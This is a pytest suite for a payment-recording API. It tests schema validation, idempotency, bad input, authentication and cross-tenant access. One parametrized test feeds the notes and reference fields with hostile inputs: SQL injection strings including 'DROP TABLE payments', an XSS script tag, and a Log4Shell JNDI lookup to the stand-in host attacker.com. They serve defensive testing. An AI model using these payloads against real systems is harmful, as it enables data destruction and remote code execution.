"""
PG-SETU Core Financial Engine: POST /api/payments Test Suite
Framework: pytest + httpx + pydantic
"""

import pytest
import httpx
import uuid
from typing import Optional, Dict, Any
from pydantic import BaseModel, Field

BASE_URL = "http://localhost:3000"
ENDPOINT = "/api/payments"

# ============================================================================
# RESPONSE CONTRACT VALIDATION SCHEMAS
# ============================================================================

class PaymentRecord(BaseModel):
    id: str
    payment_number: str = Field(pattern=r"^PAY-\d{4}-\d+")
    resident_id: str
    amount_paise: int = Field(gt=0)
    payment_method: str
    status: str = Field(pattern=r"^(completed|pending|reversed)$")
    allocated_paise: Optional[int] = 0
    unallocated_advance_paise: Optional[int] = 0

class PaymentSuccessResponse(BaseModel):
    success: bool = True
    payment: Optional[PaymentRecord] = None
    payment_id: Optional[str] = None
    payment_number: Optional[str] = None
    is_duplicate_suppressed: bool = False

# ============================================================================
# FIXTURES
# ============================================================================

@pytest.fixture(scope="session")
def owner_token() -> str:
    return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyX293bmVyX2ExIiwicm9sZSI6ImF1dGhlbnRpY2F0ZWQiLCJvcmdJZCI6Im9yZ19hIn0.VALID_SIGNATURE_A"

@pytest.fixture(scope="session")
def resident_token() -> str:
    return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyX3Jlc18xIiwicm9sZSI6InJlc2lkZW50Iiwib3JnSWQiOiJvcmdfYSJ9.VALID_SIGNATURE_RES"

@pytest.fixture(scope="session")
def foreign_org_owner_token() -> str:
    return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyX293bmVyX2IxIiwicm9sZSI6ImF1dGhlbnRpY2F0ZWQiLCJvcmdJZCI6Im9yZ19iIn0.VALID_SIGNATURE_B"

@pytest.fixture
def valid_payment_payload() -> Dict[str, Any]:
    return {
        "resident_id": "99999999-0000-0000-0000-000000000001",
        "amount_paise": 500000,
        "payment_method": "upi",
        "payment_date": "2026-09-09",
        "transaction_id": f"TXN_{uuid.uuid4().hex[:12].upper()}",
        "reference_no": "UPI-REF-8921",
        "notes": "September Room Rent",
        "idempotency_key": f"key_{uuid.uuid4()}"
    }

# ============================================================================
# 1. FUNCTIONAL TESTS
# ============================================================================

class TestPaymentsFunctional:

    def test_record_payment_success_200_and_schema_validation(self, owner_token, valid_payment_payload):
        headers = {
            "Authorization": f"Bearer {owner_token}",
            "Content-Type": "application/json"
        }
        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res.status_code in (200, 201)
            assert "application/json" in res.headers.get("Content-Type", "")
            data = res.json()
            validated = PaymentSuccessResponse(**data)
            assert validated.success is True

    def test_idempotency_duplicate_submission_suppression(self, owner_token, valid_payment_payload):
        shared_key = f"idem_{uuid.uuid4()}"
        valid_payment_payload["idempotency_key"] = shared_key
        headers = {"Authorization": f"Bearer {owner_token}", "Content-Type": "application/json"}

        with httpx.Client(base_url=BASE_URL) as client:
            res1 = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res1.status_code in (200, 201)
            data1 = res1.json()
            first_id = data1.get("payment_id") or data1.get("payment", {}).get("id")

            res2 = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res2.status_code in (200, 201)
            data2 = res2.json()
            assert data2.get("is_duplicate_suppressed") is True
            assert (data2.get("payment_id") or data2.get("payment", {}).get("id")) == first_id

    @pytest.mark.parametrize("method", ["cash", "upi", "bank_transfer", "card", "other"])
    def test_all_valid_payment_methods(self, owner_token, valid_payment_payload, method):
        valid_payment_payload["payment_method"] = method
        valid_payment_payload["idempotency_key"] = f"idem_{uuid.uuid4()}"
        headers = {"Authorization": f"Bearer {owner_token}", "Content-Type": "application/json"}

        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res.status_code in (200, 201)
            assert res.json().get("success") is True

# ============================================================================
# 2. NEGATIVE & BOUNDARY TESTS
# ============================================================================

class TestPaymentsNegative:

    @pytest.mark.parametrize("missing_field", ["resident_id", "amount_paise", "payment_method"])
    def test_missing_required_fields_one_by_one_400(self, owner_token, valid_payment_payload, missing_field):
        del valid_payment_payload[missing_field]
        headers = {"Authorization": f"Bearer {owner_token}", "Content-Type": "application/json"}

        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res.status_code == 400

    @pytest.mark.parametrize("field,wrong_value", [
        ("amount_paise", "five_thousand"),
        ("amount_paise", 100.50),
        ("resident_id", 12345),
        ("payment_method", "bitcoin"),
        ("payment_date", "09/09/2026"),
    ])
    def test_invalid_data_types_and_enums_400(self, owner_token, valid_payment_payload, field, wrong_value):
        valid_payment_payload[field] = wrong_value
        headers = {"Authorization": f"Bearer {owner_token}", "Content-Type": "application/json"}

        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res.status_code in (400, 422)

    @pytest.mark.parametrize("boundary_amount", [0, -1, -500000])
    def test_numeric_boundary_non_positive_amount_400(self, owner_token, valid_payment_payload, boundary_amount):
        valid_payment_payload["amount_paise"] = boundary_amount
        headers = {"Authorization": f"Bearer {owner_token}", "Content-Type": "application/json"}

        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res.status_code == 400

    def test_empty_json_body_400(self, owner_token):
        headers = {"Authorization": f"Bearer {owner_token}", "Content-Type": "application/json"}
        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json={}, headers=headers)
            assert res.status_code == 400

    def test_malformed_json_body_400(self, owner_token):
        headers = {"Authorization": f"Bearer {owner_token}", "Content-Type": "application/json"}
        malformed_raw = '{"resident_id": "123", "amount_paise": '
        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, content=malformed_raw, headers=headers)
            assert res.status_code in (400, 500)

    @pytest.mark.parametrize("attack_vector", [
        "' OR '1'='1' --",
        "'; DROP TABLE payments; --",
        "<script>alert('XSS')</script>",
        "${jndi:ldap://attacker.com/a}",
    ])
    def test_sql_injection_and_xss_in_text_fields(self, owner_token, valid_payment_payload, attack_vector):
        valid_payment_payload["notes"] = attack_vector
        valid_payment_payload["reference_no"] = attack_vector
        valid_payment_payload["idempotency_key"] = f"idem_{uuid.uuid4()}"
        headers = {"Authorization": f"Bearer {owner_token}", "Content-Type": "application/json"}

        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res.status_code in (200, 201, 400)
            if res.status_code in (200, 201):
                assert "<script>" not in res.text

# ============================================================================
# 3. AUTHENTICATION & OBJECT-LEVEL AUTHORIZATION (BOLA / IDOR)
# ============================================================================

class TestPaymentsAuthAndTenantIsolation:

    def test_missing_auth_header_401(self, valid_payment_payload):
        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json=valid_payment_payload)
            assert res.status_code == 401

    def test_expired_auth_token_401(self, valid_payment_payload):
        expired_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsImV4cCI6MTYwMDAwMDAwMH0.EXPIRED_SIGNATURE"
        headers = {"Authorization": f"Bearer {expired_token}", "Content-Type": "application/json"}

        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res.status_code == 401

    def test_malformed_auth_token_401(self, valid_payment_payload):
        headers = {"Authorization": "Bearer not-a-valid-jwt", "Content-Type": "application/json"}

        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res.status_code == 401

    def test_forbidden_role_resident_token_403(self, resident_token, valid_payment_payload):
        headers = {"Authorization": f"Bearer {resident_token}", "Content-Type": "application/json"}

        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res.status_code == 403

    def test_object_level_auth_cross_tenant_resident_leakage_400_or_404(
        self, foreign_org_owner_token, valid_payment_payload
    ):
        headers = {"Authorization": f"Bearer {foreign_org_owner_token}", "Content-Type": "application/json"}

        with httpx.Client(base_url=BASE_URL) as client:
            res = client.post(ENDPOINT, json=valid_payment_payload, headers=headers)
            assert res.status_code in (400, 403, 404, 500)
            assert res.status_code not in (200, 201), "BOLA/IDOR Vulnerability: cross-tenant access allowed!"
